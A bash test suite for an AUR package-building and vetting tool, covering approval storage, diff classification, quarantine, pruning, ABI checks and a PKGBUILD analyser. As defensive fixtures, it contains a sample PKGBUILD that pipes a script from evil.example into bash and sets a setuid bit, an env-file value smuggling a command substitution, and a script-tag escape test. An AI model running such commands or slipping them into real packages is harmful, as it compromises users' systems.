#!/usr/bin/env bash
# aur-forge test suite — exercises the diff classifier and approval store.
# Run with `bash tests/run-tests.sh` from the repo root. Returns non-zero
# if any test fails. Tests are self-contained: they use /tmp/aur-forge-tests
# as scratch and don't touch the real /approvals directory.
set -euo pipefail

TEST_TMP="$(mktemp -d)"
trap 'rm -rf "$TEST_TMP"' EXIT

# Tell approval-store.sh to use the test dir.
export APPROVALS_DIR="${TEST_TMP}/approvals"
mkdir -p "$APPROVALS_DIR"

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
SCRIPTS="${REPO_ROOT}/scripts"

PASS=0
FAIL=0
FAILED_TESTS=()

pass() { PASS=$((PASS+1)); echo "  PASS: $1"; }
fail() { FAIL=$((FAIL+1)); FAILED_TESTS+=("$1"); echo "  FAIL: $1" >&2; }
assert_eq() {
    local actual="$1" expected="$2" name="$3"
    if [[ "$actual" == "$expected" ]]; then
        pass "$name (got '$actual')"
    else
        fail "$name (expected '$expected', got '$actual')"
    fi
}

echo "=== approval-store.sh ==="
# shellcheck disable=SC1090
source "${SCRIPTS}/approval-store.sh"

# 1. Empty store → read_approval returns 1.
if read_approval "ghost" >/dev/null 2>&1; then
    fail "read_approval on missing pkg should fail"
else
    pass "read_approval on missing pkg returns non-zero"
fi

# 2. approval_exists on missing pkg returns 1.
if approval_exists "ghost"; then
    fail "approval_exists on missing pkg should be false"
else
    pass "approval_exists on missing pkg returns false"
fi

# 3. write_approval creates file with correct schema.
write_approval "hello-pkg" \
    "abc123" "def456" "1.0.0-1" \
    "null" "false" "false" "test notes"
if [[ ! -s "${APPROVALS_DIR}/hello-pkg.json" ]]; then
    fail "write_approval didn't create file"
else
    pass "write_approval created approval file"
    schema_pkg="$(jq -r '.package' "${APPROVALS_DIR}/hello-pkg.json")"
    assert_eq "$schema_pkg" "hello-pkg"  "stored .package field"
    schema_sha="$(jq -r '.pkgbuild_sha256' "${APPROVALS_DIR}/hello-pkg.json")"
    assert_eq "$schema_sha" "abc123"     "stored .pkgbuild_sha256 field"
    schema_issue="$(jq -r '.issue' "${APPROVALS_DIR}/hello-pkg.json")"
    assert_eq "$schema_issue" "null"     "stored .issue field (null)"
    schema_blocklist="$(jq -r '.blocklist_match_at_approval' "${APPROVALS_DIR}/hello-pkg.json")"
    assert_eq "$schema_blocklist" "false" "stored .blocklist_match_at_approval field"
fi

# 4. approval_field returns correct value.
field_val="$(approval_field "hello-pkg" srcinfo_sha256)"
assert_eq "$field_val" "def456" "approval_field returns srcinfo_sha256"

# 5. list_approved emits package names.
approved_list="$(list_approved | sort)"
assert_eq "$(printf '%s\n' "$approved_list")" "hello-pkg" "list_approved emits correct names"

# 6. write_approval is atomic — concurrent writes don't corrupt.
(
    for i in 1 2 3 4 5; do
        write_approval "race-pkg-${i}" "sha$i" "src$i" "1.$i-1" "null" "false" "false" "race-$i" &
    done
    wait
)
all_valid=1
for i in 1 2 3 4 5; do
    if ! jq -e . "${APPROVALS_DIR}/race-pkg-${i}.json" >/dev/null 2>&1; then
        all_valid=0
    fi
done
if [[ "$all_valid" -eq 1 ]]; then
    pass "concurrent write_approval leaves valid JSON files"
else
    fail "concurrent write_approval corrupted at least one JSON"
fi

# 7. remove_approval deletes the record.
remove_approval "hello-pkg"
if approval_exists "hello-pkg"; then
    fail "remove_approval didn't delete record"
else
    pass "remove_approval deletes record"
fi

echo
echo "=== srcinfo-diff.sh ==="

# Helper: make a synthetic .SRCINFO file.
make_srcinfo() {
    local file="$1"
    shift
    printf '%s\n' "$@" > "$file"
}

# Make a synthetic PKGBUILD workdir with a PKGBUILD and optional .install file.
make_workdir() {
    local dir="$1"
    mkdir -p "$dir"
    cat > "${dir}/PKGBUILD" <<'PKG'
pkgname=testpkg
pkgver=1.0.0
pkgrel=1
pkgdesc="synthetic test package"
arch=('any')
depends=('glibc')
makedepends=('git')
checkdepends=()
PKG
}

# 8. classify_diff on missing old_srcinfo → unknown (first-build sentinel).
unset APPROVAL_INSTALL_MANIFEST APPROVAL_PRIOR_FUNCTIONS
new_si="$(mktemp)"
make_srcinfo "$new_si" "pkgname = testpkg" "depends = glibc"
workdir="${TEST_TMP}/wd1"
make_workdir "$workdir"
result="$(bash "${SCRIPTS}/srcinfo-diff.sh" "" "$new_si" "$workdir")"
assert_eq "$result" "unknown" "empty old_srcinfo → unknown"
rm -f "$new_si"

# 9. version-bump: prior and current differ only in pkgver/pkgrel.
old_si="$(mktemp)"; new_si="$(mktemp)"
make_srcinfo "$old_si" \
    "pkgname = testpkg" \
    "pkgver = 0.9.0" \
    "pkgrel = 1" \
    "depends = glibc" \
    "source = https://example.com/testpkg-0.9.0.tar.gz"
make_srcinfo "$new_si" \
    "pkgname = testpkg" \
    "pkgver = 1.0.0" \
    "pkgrel = 1" \
    "depends = glibc" \
    "source = https://example.com/testpkg-1.0.0.tar.gz"
# Note: source URL changed because the upstream tarball name changed.
# That means classify_diff will report code-changed. This is a known
# limitation: we can't perfectly distinguish "version bump that
# includes new tarball name" from "code change" without the full prior
# srcinfo. The version-bump path is taken when ONLY pkgver/pkgrel/epoch
# + checksums change. Here the source URL contains the version, so it's
# actually a benign version bump — our gate errs on the side of caution.
result="$(bash "${SCRIPTS}/srcinfo-diff.sh" "$old_si" "$new_si" "$workdir")"
assert_eq "$result" "code-changed" "source URL containing version → code-changed (safe default)"
rm -f "$old_si" "$new_si"

# 10. deps-changed: prior deps differ.
old_si="$(mktemp)"; new_si="$(mktemp)"
make_srcinfo "$old_si" \
    "pkgname = testpkg" \
    "pkgver = 1.0.0" \
    "pkgrel = 1" \
    "depends = glibc" \
    "source = https://example.com/testpkg-1.0.0.tar.gz"
make_srcinfo "$new_si" \
    "pkgname = testpkg" \
    "pkgver = 1.0.0" \
    "pkgrel = 1" \
    "depends = glibc" \
    "depends = newlib" \
    "source = https://example.com/testpkg-1.0.0.tar.gz"
# Source unchanged, but deps differ.
# However source-changed still trips first. Let me make source match.
make_srcinfo "$old_si" \
    "pkgname = testpkg" "pkgver = 1.0.0" "pkgrel = 1" \
    "depends = glibc" \
    "source = https://example.com/testpkg.tar.gz"
make_srcinfo "$new_si" \
    "pkgname = testpkg" "pkgver = 1.0.0" "pkgrel = 1" \
    "depends = glibc" "depends = newlib" \
    "source = https://example.com/testpkg.tar.gz"
result="$(bash "${SCRIPTS}/srcinfo-diff.sh" "$old_si" "$new_si" "$workdir")"
assert_eq "$result" "deps-changed" "added dep → deps-changed"
rm -f "$old_si" "$new_si"

# 11. install-added: prior manifest empty, current has a file.
echo "" > /tmp/empty_manifest
# But the prior manifest via env is a newline-separated list, not a file.
old_si="$(mktemp)"; new_si="$(mktemp)"
make_srcinfo "$old_si" "pkgname = testpkg" "depends = glibc"
make_srcinfo "$new_si" "pkgname = testpkg" "depends = glibc"
# Install files in workdir.
echo "post_install() { :; }" > "${workdir}/testpkg.install"
APPROVAL_INSTALL_MANIFEST="" \
result="$(APPROVAL_INSTALL_MANIFEST="" bash "${SCRIPTS}/srcinfo-diff.sh" "$old_si" "$new_si" "$workdir")"
assert_eq "$result" "install-added" "new .install file → install-added"
rm -f "$old_si" "$new_si"
rm -f "${workdir}/testpkg.install"

# 12. install-edited: same name, different sha.
echo "post_install() { echo old; }" > "${workdir}/testpkg.install"
old_sha="$(sha256sum "${workdir}/testpkg.install" | awk '{print $1}')"
echo "post_install() { echo new; }" > "${workdir}/testpkg.install"
old_si="$(mktemp)"; new_si="$(mktemp)"
make_srcinfo "$old_si" "pkgname = testpkg" "depends = glibc"
make_srcinfo "$new_si" "pkgname = testpkg" "depends = glibc"
new_sha="$(sha256sum "${workdir}/testpkg.install" | awk '{print $1}')"
APPROVAL_INSTALL_MANIFEST="${old_sha}  testpkg.install" \
result="$(APPROVAL_INSTALL_MANIFEST="${old_sha}  testpkg.install" \
         bash "${SCRIPTS}/srcinfo-diff.sh" "$old_si" "$new_si" "$workdir")"
assert_eq "$result" "install-edited" "modified .install file → install-edited"
rm -f "$old_si" "$new_si"
rm -f "${workdir}/testpkg.install"

# 13. Identical content → version-bump.
old_si="$(mktemp)"; new_si="$(mktemp)"
make_srcinfo "$old_si" \
    "pkgname = testpkg" "pkgver = 1.0.0" "pkgrel = 1" \
    "depends = glibc" \
    "source = https://example.com/testpkg-1.0.0.tar.gz"
make_srcinfo "$new_si" \
    "pkgname = testpkg" "pkgver = 1.0.0" "pkgrel = 1" \
    "depends = glibc" \
    "source = https://example.com/testpkg-1.0.0.tar.gz"
# Identical fields including source. Function-bodies env unset → ignored.
result="$(bash "${SCRIPTS}/srcinfo-diff.sh" "$old_si" "$new_si" "$workdir")"
assert_eq "$result" "version-bump" "identical srcinfo → version-bump (treated as auto-update)"
rm -f "$old_si" "$new_si"

echo
echo "=== open-quarantine-issue.sh (smoke) ==="

# 14. Missing args → exit 2.
if bash "${SCRIPTS}/open-quarantine-issue.sh" 2>/dev/null; then
    fail "open-quarantine-issue.sh without args should exit non-zero"
else
    pass "open-quarantine-issue.sh without args exits non-zero"
fi

# 15. Missing GITHUB_TOKEN → exit 1 + warning.
DETAILS="$(mktemp)"
jq -n '{package:"x", reason:"TEST", pkgbuild_sha256:"a", srcinfo_sha256:"b", approved_version:"1.0-1", workdir:"/cache/work/x", blocklist_match:false, archcanary_exit_code:"n/a"}' > "$DETAILS"
unset GITHUB_TOKEN
if bash "${SCRIPTS}/open-quarantine-issue.sh" "x" "TEST" "$DETAILS" 2>/tmp/open.err; then
    fail "open-quarantine-issue.sh without token should exit non-zero"
else
    pass "open-quarantine-issue.sh without token exits non-zero"
    if grep -q "GITHUB_TOKEN unset" /tmp/open.err; then
        pass "open-quarantine-issue.sh logs clear warning"
    else
        fail "open-quarantine-issue.sh should log clear warning"
    fi
fi
rm -f "$DETAILS"

echo
echo "=== drain-quarantine.sh (smoke) ==="

# 16. Missing GITHUB_TOKEN → exits 0 silently.
unset GITHUB_TOKEN
if bash "${SCRIPTS}/drain-quarantine.sh" 2>/tmp/drain.err; then
    pass "drain-quarantine.sh without token exits 0"
else
    fail "drain-quarantine.sh without token should exit 0"
fi

# 17. Bad arg → exit 2.
if bash "${SCRIPTS}/drain-quarantine.sh" --bad-arg 2>/dev/null; then
    fail "drain-quarantine.sh with bad arg should exit non-zero"
else
    pass "drain-quarantine.sh with bad arg exits non-zero"
fi

echo
echo "=== build.sh syntax (no execution — needs arch environment) ==="

# 18. All scripts pass `bash -n`.
for f in "${SCRIPTS}/approval-store.sh" \
         "${SCRIPTS}/srcinfo-diff.sh" \
         "${SCRIPTS}/open-quarantine-issue.sh" \
         "${SCRIPTS}/drain-quarantine.sh"; do
    if bash -n "$f" 2>/dev/null; then
        pass "bash -n $f"
    else
        fail "bash -n $f — syntax error"
    fi
done

if bash -n "${REPO_ROOT}/build.sh" 2>/dev/null; then
    pass "bash -n build.sh"
else
    fail "bash -n build.sh — syntax error"
fi

echo
echo "=== runtime env / local chroot repo / pre-seeded PGP keys ==="
# 1. systemd does not hand the container env to services: the unit must
#    forward the settings the scripts read.
for v in REPO_NAME GITHUB_TOKEN TZ NIGHTLY_AT GITHUB_REPO; do
    if grep -E '^PassEnvironment=' "${REPO_ROOT}/aur-forge.service" | grep -qw "$v"; then
        pass "aur-forge.service PassEnvironment forwards $v"
    else
        fail "aur-forge.service PassEnvironment is missing $v"
    fi
done

# 2. build.sh must agree with update.sh/init.sh/serve.sh on REPO_NAME's default.
if grep -q 'REPO_NAME="${REPO_NAME:-aur-forge}"' "${REPO_ROOT}/build.sh"; then
    pass "build.sh REPO_NAME defaults to aur-forge"
else
    fail "build.sh REPO_NAME default is not aur-forge (writes to the wrong repo dir)"
fi

# 3. configure_chroot_local_repo: enabled only when the db exists.
CHR_TMP="${TEST_TMP}/chroot-conf"
mkdir -p "${CHR_TMP}/pacman.conf.d" "${CHR_TMP}/repo/aur-forge.x86_64"
printf '[core]\nInclude = /etc/pacman.d/mirrorlist\n[extra]\nInclude = /etc/pacman.d/mirrorlist\n' \
    > "${CHR_TMP}/pacman.conf.d/extra.conf"
sed -n '/^configure_chroot_local_repo()/,/^}/p' "${REPO_ROOT}/build.sh" > "${CHR_TMP}/fn.sh"
run_cfg() {
    ( DEVTOOLS_CONF_DIR="${CHR_TMP}" REPO_NAME=aur-forge REPO_DIR="${CHR_TMP}/repo/aur-forge.x86_64" \
      bash -c 'source "$1"; configure_chroot_local_repo' _ "${CHR_TMP}/fn.sh" >/dev/null )
}
run_cfg
if [[ ! -e "${CHR_TMP}/pacman.conf.d/extra-x86_64.conf" && ! -e "${CHR_TMP}/mount.d/x86_64" ]]; then
    pass "no local-repo drop-ins while the db does not exist"
else
    fail "local-repo drop-ins written although the db does not exist"
fi
touch "${CHR_TMP}/repo/aur-forge.x86_64/aur-forge.db"; echo x > "${CHR_TMP}/repo/aur-forge.x86_64/aur-forge.db"
run_cfg
if grep -q '^\[aur-forge\]$' "${CHR_TMP}/pacman.conf.d/extra-x86_64.conf" \
   && grep -q "^Server = file://${CHR_TMP}/repo/aur-forge.x86_64\$" "${CHR_TMP}/pacman.conf.d/extra-x86_64.conf" \
   && grep -q '^\[extra\]$' "${CHR_TMP}/pacman.conf.d/extra-x86_64.conf"; then
    pass "local repo stanza appended after the stock extra.conf"
else
    fail "local repo stanza missing/malformed in extra-x86_64.conf"
fi
assert_eq "$(cat "${CHR_TMP}/mount.d/x86_64")" "ro ${CHR_TMP}/repo/aur-forge.x86_64" "mount.d/x86_64 binds the repo read-only"
rm -f "${CHR_TMP}/repo/aur-forge.x86_64/aur-forge.db"
run_cfg
if [[ ! -e "${CHR_TMP}/pacman.conf.d/extra-x86_64.conf" && ! -e "${CHR_TMP}/mount.d/x86_64" ]]; then
    pass "drop-ins are removed again when the db disappears"
else
    fail "stale local-repo drop-ins left behind"
fi

# 4. Pre-seeded PGP keys: file name must be the primary fingerprint.
shopt -s nullglob
asc_files=( "${REPO_ROOT}"/validpgp-keys/*.asc )
shopt -u nullglob
if [[ ${#asc_files[@]} -eq 0 ]]; then
    fail "validpgp-keys/ contains no .asc files"
fi
for asc in "${asc_files[@]}"; do
    want="$(basename "$asc" .asc)"
    have="$(gpg --batch --show-keys --with-colons "$asc" 2>/dev/null | awk -F: '$1=="fpr" {print $10; exit}')"
    assert_eq "$have" "$want" "validpgp-keys/$(basename "$asc") primary fingerprint matches file name"
done
if grep -q 'validpgp-keys' "${REPO_ROOT}/Dockerfile" && grep -q 'validpgp-keys' "${REPO_ROOT}/init.sh"; then
    pass "Dockerfile copies and init.sh imports validpgp-keys"
else
    fail "validpgp-keys not wired into Dockerfile/init.sh"
fi

# 5. Scheduler must honour TZ when parsing NIGHTLY_AT (`date -u -d` ignores TZ).
if grep -nE 'date -u -d "(today|tomorrow) \$\{NIGHTLY_AT\}"' "${REPO_ROOT}/run.sh" >/dev/null; then
    fail "run.sh parses NIGHTLY_AT with 'date -u' (TZ ignored -> fires in UTC)"
else
    pass "run.sh parses NIGHTLY_AT without 'date -u'"
fi
ny_epoch="$(TZ=America/New_York date -d 'today 03:00' +%s)"
utc_epoch="$(TZ=UTC date -d 'today 03:00' +%s)"
if (( ny_epoch != utc_epoch )); then
    pass "03:00 America/New_York and 03:00 UTC resolve to different instants"
else
    fail "TZ not honoured when parsing NIGHTLY_AT"
fi

echo
echo "=== mini-mirror: prune / rebuild-bump / check-abi / mirror / issue auth ==="
# --- prune-repo.sh ----------------------------------------------------------
# shellcheck disable=SC1090
source "${SCRIPTS}/prune-repo.sh"
PR_TMP="${TEST_TMP}/prune"; mkdir -p "$PR_TMP"
printf '%s\n' foo-1.0-1-x86_64.pkg.tar.zst foo-1.1-1-x86_64.pkg.tar.zst foo-1.2-1-x86_64.pkg.tar.zst \
    foo-1.2-1.1-x86_64.pkg.tar.zst bar-1-1-any.pkg.tar.zst 'tri-1:1.68-1-any.pkg.tar.zst' 'tri-2.0-1-any.pkg.tar.zst' \
    > "$PR_TMP/files"
: > "$PR_TMP/protected"
assert_eq "$(prune_candidates 2 "$PR_TMP/protected" < "$PR_TMP/files" | sort | tr '\n' ' ')" \
    "foo-1.0-1-x86_64.pkg.tar.zst foo-1.1-1-x86_64.pkg.tar.zst " "prune keeps newest 2 per package (rebuild suffix + epoch ordering)"
assert_eq "$(prune_candidates 1 "$PR_TMP/protected" < "$PR_TMP/files" | sort | tr '\n' ' ')" \
    "foo-1.0-1-x86_64.pkg.tar.zst foo-1.1-1-x86_64.pkg.tar.zst foo-1.2-1-x86_64.pkg.tar.zst tri-2.0-1-any.pkg.tar.zst " \
    "prune --keep 1 honours epoch (1:1.68 beats 2.0)"
echo "foo-1.0-1" > "$PR_TMP/protected"
assert_eq "$(prune_candidates 1 "$PR_TMP/protected" < "$PR_TMP/files" | grep -c 'foo-1.0-1')" "0" "prune never removes the version the db points at"
# end-to-end with a real tar db
mkdir -p "$PR_TMP/repo/dbsrc/foo-1.2-1.1"; : > "$PR_TMP/repo/dbsrc/foo-1.2-1.1/desc"
tar --zstd -C "$PR_TMP/repo/dbsrc" -cf "$PR_TMP/repo/aur-forge.db.tar.zst" foo-1.2-1.1
for f in foo-1.0-1 foo-1.1-1 foo-1.2-1 foo-1.2-1.1; do : > "$PR_TMP/repo/${f}-x86_64.pkg.tar.zst"; : > "$PR_TMP/repo/${f}-x86_64.pkg.tar.zst.sig"; done
bash "${SCRIPTS}/prune-repo.sh" --keep 2 --repo-dir "$PR_TMP/repo" --name aur-forge >/dev/null 2>&1
assert_eq "$(cd "$PR_TMP/repo" && ls foo-*.pkg.tar.zst | tr '\n' ' ')" "foo-1.2-1-x86_64.pkg.tar.zst foo-1.2-1.1-x86_64.pkg.tar.zst " "prune-repo.sh removes old files"
assert_eq "$(cd "$PR_TMP/repo" && ls foo-*.sig | wc -l | tr -d ' ')" "2" "prune-repo.sh removes the matching .sig files"
rm -f "$PR_TMP/repo/aur-forge.db.tar.zst"
assert_eq "$(bash "${SCRIPTS}/prune-repo.sh" --keep 1 --repo-dir "$PR_TMP/repo" --name aur-forge 2>/dev/null | wc -l | tr -d ' ')" "0" "prune-repo.sh refuses to delete without a db"

# --- rebuild-bump.sh --------------------------------------------------------
# shellcheck disable=SC1090
source "${SCRIPTS}/rebuild-bump.sh"
rb() { next_rebuild_pkgrel "$@" 2>/dev/null || echo REFUSE; }
assert_eq "$(rb "" "" 1.0 1)"            "1"      "first build keeps upstream pkgrel"
assert_eq "$(rb 1.0-1 "" 1.0 1)"         "1.1"    "same version in repo -> pkgrel 1.1"
assert_eq "$(rb 1.0-1.1 "" 1.0 1)"       "1.2"    "second rebuild -> 1.2"
assert_eq "$(rb 1.0-1.9 "" 1.0 1)"       "1.10"   "1.9 -> 1.10 (numeric, not lexical)"
assert_eq "$(rb 1.0-1.2 "" 1.0 2)"       "2"      "upstream pkgrel 2 supersedes our 1.2"
assert_eq "$(rb 1.0-1 "" 1.1 1)"         "1"      "newer upstream pkgver needs no bump"
assert_eq "$(rb 1:1.68-1 1 1.68 1)"      "1.1"    "epoch is honoured"
assert_eq "$(rb 1.1-1 "" 1.0 1)"         "REFUSE" "upstream pkgver went backwards -> refuse"

# --- check-abi.sh (real ELF via gcc when available) -------------------------
if command -v gcc >/dev/null 2>&1 && command -v readelf >/dev/null 2>&1 && command -v zstd >/dev/null 2>&1; then
    AB="${TEST_TMP}/abi"; mkdir -p "$AB/build" "$AB/repo"
    cat > "$AB/build/foo.c" <<'EOC'
int foo(void) { return 1; }
EOC
    cat > "$AB/build/main.c" <<'EOC'
int foo(void);
int main(void) { return foo() - 1; }
EOC
    ( cd "$AB/build" \
      && gcc -shared -fPIC -Wl,-soname,libfoo.so.1 -o libfoo.so.1 foo.c \
      && gcc main.c -o app -L. -l:libfoo.so.1 )
    # package "app": needs libfoo.so.1 (+ libc) and does NOT ship it
    mkdir -p "$AB/pkg-app/usr/bin"; cp "$AB/build/app" "$AB/pkg-app/usr/bin/app"
    tar --zstd -C "$AB/pkg-app" -cf "$AB/repo/app-1.0-1-x86_64.pkg.tar.zst" usr
    # package "pyfoo": python 3.14 payload
    mkdir -p "$AB/pkg-py/usr/lib/python3.14/site-packages"; echo x > "$AB/pkg-py/usr/lib/python3.14/site-packages/m.py"
    tar --zstd -C "$AB/pkg-py" -cf "$AB/repo/pyfoo-1.0-1-any.pkg.tar.zst" usr
    # package "bundled": ships its own libfoo.so.1 next to the binary
    mkdir -p "$AB/pkg-b/opt/b"; cp "$AB/build/app" "$AB/build/libfoo.so.1" "$AB/pkg-b/opt/b/"
    tar --zstd -C "$AB/pkg-b" -cf "$AB/repo/bundled-1.0-1-x86_64.pkg.tar.zst" opt
    run_abi() { ABI_STATE_DIR="$AB/state-$1" bash "${SCRIPTS}/check-abi.sh" --root "$2" --repo-dir "$AB/repo" 2>/dev/null; }
    mkroot() { mkdir -p "$AB/$1/usr/lib"; : > "$AB/$1/usr/lib/libc.so.6"; : > "$AB/$1/usr/lib/libm.so.6"; }
    mkroot rootok;  : > "$AB/rootok/usr/lib/libfoo.so.1"; mkdir -p "$AB/rootok/usr/lib/python3.14"
    mkroot rootbad; : > "$AB/rootbad/usr/lib/libfoo.so.2"; mkdir -p "$AB/rootbad/usr/lib/python3.15"
    assert_eq "$(run_abi ok "$AB/rootok" | wc -l | tr -d ' ')" "0" "check-abi: healthy chroot -> nothing stale"
    bad="$(run_abi bad "$AB/rootbad")"
    case "$bad" in *$'app\tmissing=libfoo.so.1'*) pass "check-abi: soname gone -> app flagged (missing=libfoo.so.1)" ;; *) fail "check-abi: app not flagged (got: $bad)" ;; esac
    case "$bad" in *$'pyfoo\tpython=3.14->3.15'*) pass "check-abi: python minor bump -> pyfoo flagged" ;; *) fail "check-abi: pyfoo not flagged (got: $bad)" ;; esac
    case "$bad" in *bundled*) fail "check-abi: bundled lib should satisfy the dependency (got: $bad)" ;; *) pass "check-abi: package bundling its own lib is not flagged" ;; esac
    # a lib the OFFICIAL repos provide (sync db %PROVIDES%) is obtainable at install
    # time even though the minimal chroot lacks it -> not stale
    mkdir -p "$AB/rootprov/usr/lib" "$AB/rootprov/var/lib/pacman/sync" "$AB/dbsrc/libfoo-1-1"
    : > "$AB/rootprov/usr/lib/libc.so.6"; : > "$AB/rootprov/usr/lib/libm.so.6"; : > "$AB/rootprov/usr/lib/libfoo.so.2"
    mkdir -p "$AB/rootprov/usr/lib/python3.14"
    printf '%%NAME%%\nlibfoo\n\n%%PROVIDES%%\nlibfoo.so=1-64\n\n%%DEPENDS%%\nglibc\n' > "$AB/dbsrc/libfoo-1-1/desc"
    tar -C "$AB/dbsrc" -czf "$AB/rootprov/var/lib/pacman/sync/extra.db" libfoo-1-1
    assert_eq "$(run_abi prov "$AB/rootprov" | wc -l | tr -d ' ')" "0" "check-abi: soname provided by an official package is not stale"
    # ...and the same for a lib only visible in a files db (no %PROVIDES%)
    mkdir -p "$AB/rootfiles/usr/lib/python3.14" "$AB/rootfiles/var/lib/pacman/sync" "$AB/fdbsrc/libfoo-1-1"
    : > "$AB/rootfiles/usr/lib/libc.so.6"; : > "$AB/rootfiles/usr/lib/libm.so.6"
    printf '%%FILES%%\nusr/\nusr/lib/\nusr/lib/libfoo.so.1\n' > "$AB/fdbsrc/libfoo-1-1/files"
    tar -C "$AB/fdbsrc" -czf "$AB/rootfiles/var/lib/pacman/sync/extra.files" libfoo-1-1
    assert_eq "$(run_abi files "$AB/rootfiles" | wc -l | tr -d ' ')" "0" "check-abi: soname present in an official files db is not stale"
    # second run re-uses the cache and gives the same answer
    assert_eq "$(ABI_STATE_DIR="$AB/state-bad" bash "${SCRIPTS}/check-abi.sh" --root "$AB/rootbad" --repo-dir "$AB/repo" 2>/dev/null)" "$bad" "check-abi: cached run is stable"
else
    echo "  SKIP: check-abi ELF tests need gcc + readelf + zstd"
fi

# --- PACMAN_MIRROR (init.sh) ------------------------------------------------
ML="${TEST_TMP}/mirrorlist"; printf 'Server = https://geo.example/$repo/os/$arch\n' > "$ML"
export PACMAN_MIRROR='http://pacoloco:9129/repo/archlinux/$repo/os/$arch'
( source <(sed -n '/^configure_pacman_mirror()/,/^}/p' "${REPO_ROOT}/init.sh"); configure_pacman_mirror "$ML" >/dev/null; configure_pacman_mirror "$ML" >/dev/null )
assert_eq "$(grep -c 'pacoloco' "$ML")" "1" "PACMAN_MIRROR is added once (idempotent)"
assert_eq "$(sed -n 2p "$ML")" 'Server = http://pacoloco:9129/repo/archlinux/$repo/os/$arch' "PACMAN_MIRROR goes first, stock mirror kept as fallback"
( export PACMAN_MIRROR=; source <(sed -n '/^configure_pacman_mirror()/,/^}/p' "${REPO_ROOT}/init.sh"); configure_pacman_mirror "$ML" >/dev/null )
assert_eq "$(grep -c 'pacoloco' "$ML")" "0" "unsetting PACMAN_MIRROR removes the block"
unset PACMAN_MIRROR

# --- wiring / regressions ---------------------------------------------------
if grep -rn 'token \*\*\*' "${REPO_ROOT}/scripts" "${REPO_ROOT}"/*.sh >/dev/null 2>&1; then
    fail "a script sends the literal Authorization header 'token ***' (redaction artifact)"
else
    pass "no literal 'token ***' Authorization header in any script"
fi
if grep -q 'token \${GITHUB_TOKEN}' "${SCRIPTS}/open-quarantine-issue.sh"; then
    pass "open-quarantine-issue.sh authenticates with \${GITHUB_TOKEN}"
else
    fail "open-quarantine-issue.sh does not use \${GITHUB_TOKEN}"
fi
grep -q 'already exists for' "${SCRIPTS}/open-quarantine-issue.sh" \
    && pass "open-quarantine-issue.sh de-duplicates open Issues" || fail "open-quarantine-issue.sh has no duplicate guard"
grep -q 'build.sh --scan-only' "${REPO_ROOT}/run.sh" \
    && pass "nightly re-scan uses --scan-only (not the no-op --dry-run)" || fail "run.sh re-scan still uses --dry-run"
# update.sh must keep its summary + early exit (a botched edit once dropped them)
grep -q 'upstream summary' "${REPO_ROOT}/update.sh" && grep -q 'nothing to build' "${REPO_ROOT}/update.sh" \
    && pass "update.sh prints the summary and exits when there is nothing to build" \
    || fail "update.sh lost its summary / 'nothing to build' exit"
grep -q 'recorded pre-existing unresolved libs as baseline' "${REPO_ROOT}/update.sh" \
    && pass "update.sh baselines pre-existing unresolved libs (no pointless ABI rebuilds)" \
    || fail "update.sh has no ABI baseline logic"
for h in prune-repo check-abi rebuild-bump; do
    grep -q "/usr/local/bin/${h}.sh" "${REPO_ROOT}/Dockerfile" \
        && pass "Dockerfile links ${h}.sh into /usr/local/bin" || fail "Dockerfile does not link ${h}.sh"
done
for v in PACMAN_MIRROR KEEP_VERSIONS ABI_CHECK; do
    grep -E '^PassEnvironment=' "${REPO_ROOT}/aur-forge.service" | grep -qw "$v" \
        && pass "service forwards $v" || fail "service does not forward $v"
done

echo
echo "=== quarantine management: escape / analysis / decisions / package page ==="
# --- html_escape must really escape (bash >= 5.2 patsub_replacement trap) -----
# shellcheck disable=SC1090
( source "${SCRIPTS}/lib-aur.sh"
  assert_eq "$(html_escape '<script>alert("x")</script> & '"'"'q'"'"'')" \
      '&lt;script&gt;alert(&quot;x&quot;)&lt;/script&gt; &amp; &#39;q&#39;' "html_escape escapes < > & quotes on this bash" ) || true
assert_eq "$( source "${SCRIPTS}/lib-aur.sh"; html_escape '<b>' )" '&lt;b&gt;' "html_escape: < never survives"

# --- CGI environment file (lighttpd passes CGIs almost no env) ---------------
CE="${TEST_TMP}/cgi.env"
printf 'export GITHUB_TOKEN=%q\nexport REPO_NAME=%q\nexport EVIL=%q\n' 'tok$(touch '"${TEST_TMP}"'/pwned)' 'my-repo' x > "$CE"
got="$( unset GITHUB_TOKEN REPO_NAME EVIL; AUR_FORGE_CGI_ENV="$CE" bash -c 'source "$1"; echo "$GITHUB_TOKEN|$REPO_NAME|${EVIL:-unset}"' _ "${SCRIPTS}/lib-aur.sh" )"
assert_eq "$got" 'tok$(touch '"${TEST_TMP}"'/pwned)|my-repo|unset' "lib-aur.sh loads allow-listed vars from the CGI env file (no eval of values, others ignored)"
[[ ! -e "${TEST_TMP}/pwned" ]] && pass "CGI env file values are never executed" || fail "CGI env file value was executed"
assert_eq "$(unset REPO_NAME; REPO_NAME=preset AUR_FORGE_CGI_ENV="$CE" bash -c 'source "$1"; echo $REPO_NAME' _ "${SCRIPTS}/lib-aur.sh")" "preset" "variables already set by the caller win over the env file"
grep -q 'write_cgi_env' "${REPO_ROOT}/run.sh" && pass "run.sh writes the CGI env file" || fail "run.sh does not write the CGI env file"

# --- static findings ---------------------------------------------------------
QM="${TEST_TMP}/qm"; mkdir -p "$QM"
cat > "$QM/PKGBUILD" <<'EOP'
pkgname=demo
pkgver=1.0
pkgrel=1
source=("http://example.com/x.tar.gz")
sha256sums=('SKIP')
# curl http://commented | sh
prepare() {
  curl -s https://evil.example/x.sh | bash
  npm install atomic-lockfile
}
package() {
  chmod 4755 "$pkgdir/usr/bin/demo"
}
EOP
# shellcheck disable=SC1090
source "${SCRIPTS}/pkg-analysis.sh"
fnd="$(pkgbuild_findings "$QM/PKGBUILD")"
for rule in pipe-to-shell installs-from-network-at-build setuid plain-http-source checksum-skipped miner-or-known-bad-word; do
    case "$fnd" in *"$rule"*) pass "findings: $rule detected" ;; *) fail "findings: $rule NOT detected" ;; esac
done
case "$fnd" in *$'6\t'*) fail "findings: commented-out line must be ignored" ;; *) pass "findings: commented-out lines ignored" ;; esac
clean="${TEST_TMP}/clean-pkgbuild"; printf 'pkgname=ok\npkgver=1\npkgrel=1\nsource=("https://example.com/a.tar.gz")\nsha256sums=("abc")\npackage() {\n  install -Dm755 a "$pkgdir/usr/bin/a"\n}\n' > "$clean"
assert_eq "$(findings_summary "$clean")" "0 high, 0 medium, 0 info" "findings: an ordinary PKGBUILD is clean"
printf 'b2sums=(\x27%s\x27)\n' "$(printf 'a%.0s' $(seq 128))" > "${TEST_TMP}/sums-pkgbuild"
